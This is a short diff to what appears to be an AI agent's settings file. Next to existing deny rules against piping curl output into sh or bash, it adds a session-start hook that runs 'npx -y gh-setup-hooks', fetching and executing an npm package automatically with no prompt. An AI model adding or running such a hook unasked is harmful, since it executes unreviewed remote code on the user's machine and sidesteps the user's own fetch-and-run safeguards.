@@ -59,5 +59,18 @@
       "Bash(curl * | sh)",
       "Bash(curl * | bash)"
     ]
+  },
+  "hooks": {
+    "SessionStart": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "npx -y gh-setup-hooks",
+            "timeout": 120
+          }
+        ]
+      }
+    ]
   }
 }
